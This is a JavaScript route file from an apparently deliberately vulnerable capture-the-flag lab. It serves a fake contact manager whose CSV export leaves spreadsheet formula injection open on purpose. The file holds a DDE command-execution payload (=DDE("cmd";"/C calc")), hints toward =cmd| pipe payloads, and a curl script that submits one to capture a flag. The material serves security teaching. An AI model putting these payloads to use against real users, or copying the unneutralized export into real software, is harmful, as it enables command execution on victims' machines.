'use strict';
// DDE Command Execution (formula-dde): the contact manager exports
// user-supplied cells to CSV with RFC 4180 quoting only, which does not
// neutralize spreadsheet formula triggers. A =DDE(...) cell still opens as a
// live formula that asks another application to run a command, so DDE payloads
// survive the export and the flag is awarded on download.
const express = require('express');
const { getDb } = require('../../../lib/db');
const { award, captured } = require('../../../lib/flags');
const { page, esc, brief, hintLadder, toolsPill, appShell } = require('../../../lib/page');

const router = express.Router();
// Router-scoped form parsing only (app-level middleware is out of scope).
router.use(express.urlencoded({ extended: false }));

const db = getDb();
db.exec(`CREATE TABLE IF NOT EXISTS formula_entries (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  name TEXT, note TEXT, created_at TEXT
)`);
if (db.prepare('SELECT COUNT(*) AS c FROM formula_entries').get().c === 0) {
  db.prepare('INSERT INTO formula_entries (name, note, created_at) VALUES (?, ?, ?)')
    .run('Alice Smith', 'Quarterly review notes', new Date().toISOString());
}

// RFC 4180 quoting only. Quoting does NOT neutralize formulas: a cell that
// starts with = is still a live formula when the spreadsheet opens the CSV.
function csvCell(s) {
  s = String(s ?? '');
  return (/[",\n\r]/.test(s)) ? '"' + s.replace(/"/g, '""') + '"' : s;
}

// Classify an injected cell into its vuln id. All four challenge routers
// register the same /export.csv path, so the first mounted router serves
// every export request: it must award every matching vuln, exactly like the
// original combined router did, or the other three challenges could never be
// solved.
function classify(cell) {
  if (/^=HYPERLINK\(/i.test(cell)) return 'formula-hyperlink';
  if (/=DDE\(/i.test(cell)) return 'formula-dde';
  if (/^=\|/.test(cell) || /^\|/.test(cell)) return 'formula-pipe';
  if (/^=/.test(cell) && /cmd\|/i.test(cell)) return 'formula-csv';
  if (/^[=+\-@]/.test(cell)) return 'formula-csv'; // generic formula trigger
  return null;
}

const vuln = {
  id: 'formula-dde',
  name: 'DDE Command Execution',
  difficulty: 'Easy',
  hint: 'DDE lets a formula ask another application to run a command. The DDE() function form works too.',
  hints: ["DDE is an old Excel feature for command execution. The payload is =cmd|...", "DDEAUTO or cmd pipe. It's in the field value.", "Submit the DDE payload. The export carries it."],
  tools: "B",
  how: 'Put a =DDE("cmd";...) payload in a field and download the CSV export.',
  link: '/formula#formula-dde',
  start: 'curl -s -b jar -c jar http://localhost:3000/formula/ > /dev/null\ncurl -s -b jar --data-urlencode \'name==DDE("cmd";"/C calc")\' --data-urlencode "note=test" http://localhost:3000/formula/add\ncurl -s -b jar -D - http://localhost:3000/formula/export.csv -o /dev/null | grep -i x-flags',
};

function contactRows() {
  const entries = db.prepare('SELECT name, note FROM formula_entries ORDER BY id DESC').all();
  return entries.map((e) => `
    <tr><td>${esc(e.name)}</td><td>${esc(e.note)}</td></tr>`).join('\n');
}

function challengeCard(req) {
  const done = captured(req, 'formula', vuln.id);
  return `
    <div class="vuln-card">
      <h3>${esc(vuln.name)}
        <span class="diff">${esc(vuln.difficulty)}</span>
        ${done ? '<span class="captured">flag captured</span>' : ''}
      </h3>
      ${hintLadder(vuln)}
      ${toolsPill(vuln)}
      <p><i>Attack:</i> ${esc(vuln.how)}</p>
    </div>`;
}

// ---------------------------------------------------------------- index page
router.get('/', (req, res) => {
  res.send(page('ContactBase: contacts', appShell('ContactBase', `
    ${brief('Your contacts, ready for your spreadsheet', `
      <p><b>ContactBase</b> keeps your address book tidy and exports it to CSV
      whenever you need it in Excel or LibreOffice. Add contacts below, then
      hit <b>Download CSV export</b> to grab the file.</p>`)}
    <div class="card clay-card">
      <div class="card-top"><span class="orb" aria-hidden="true">◈</span><b>Add a contact</b></div>
      <form method="POST" action="/formula/add">
        <div class="clay-field">
          <label for="name">Name</label>
          <input class="clay-input" type="text" id="name" name="name" placeholder="Full name" size="40" required />
        </div>
        <div class="clay-field">
          <label for="note">Note</label>
          <input class="clay-input" type="text" id="note" name="note" placeholder="A short note" size="40" />
        </div>
        <p><button class="clay-btn clay-btn-primary" type="submit">Add contact</button></p>
      </form>
    </div>
    <div class="card clay-card">
      <div class="card-top"><span class="orb" aria-hidden="true">◈</span><b>Export</b></div>
      <p>Take the whole address book with you as a spreadsheet-ready CSV file.</p>
      <p><a class="clay-btn clay-btn-secondary" href="/formula/export.csv"><b>Download CSV export</b></a></p>
    </div>
    <h2>Current contacts</h2>
    <div class="tbl-scroll"><table class="tbl"><tr><th>Name</th><th>Note</th></tr>${contactRows()}</table></div>
    <h2>Challenge</h2>
    ${challengeCard(req)}
  `, { nav: ['Contacts', 'Export', 'Settings'], crumb: 'ContactBase / Contacts' })));
});

router.post('/add', (req, res) => {
  const name = (req.body.name || '').toString().slice(0, 200);
  const note = (req.body.note || '').toString().slice(0, 500);
  if (!name.trim()) {
    return res.status(400).send(page('Add contact', appShell('ContactBase', `
      <div class="card clay-card">
        <div class="card-top"><span class="orb" aria-hidden="true">◈</span><b>ContactBase</b></div>
        <p class="clay-err" role="alert">Name is required.</p>
        <p><a class="clay-btn clay-btn-secondary clay-btn-sm" href="/formula">Back</a></p>
      </div>`, { nav: ['Contacts', 'Export', 'Settings'] })));
  }
  db.prepare('INSERT INTO formula_entries (name, note, created_at) VALUES (?, ?, ?)')
    .run(name, note, new Date().toISOString());
  res.redirect('/formula');
});

// ------------------------------------------------------- the export endpoint
router.get('/export.csv', (req, res) => {
  const rows = db.prepare('SELECT name, note FROM formula_entries ORDER BY id').all();
  const lines = ['Name,Note'];
  const hits = new Set();
  for (const r of rows) {
    lines.push(csvCell(r.name) + ',' + csvCell(r.note));
    // VULN: cells are quoted but never neutralized for spreadsheet formulas, so
    // attacker-controlled =, +, -, @, | prefixes reach the spreadsheet live.
    for (const cell of [String(r.name), String(r.note)]) {
      const v = classify(cell);
      if (v) hits.add(v);
    }
  }
  const csv = lines.join('\r\n') + '\r\n';
  const flags = [...hits].map((v) => award(req, 'formula', v));
  res.set({
    'Content-Type': 'text/csv; charset=utf-8',
    'Content-Disposition': 'attachment; filename="contacts-export.csv"',
  });
  if (flags.length) res.set('X-Flags', flags.join(', '));
  res.send(csv);
});

module.exports = { vuln, router };
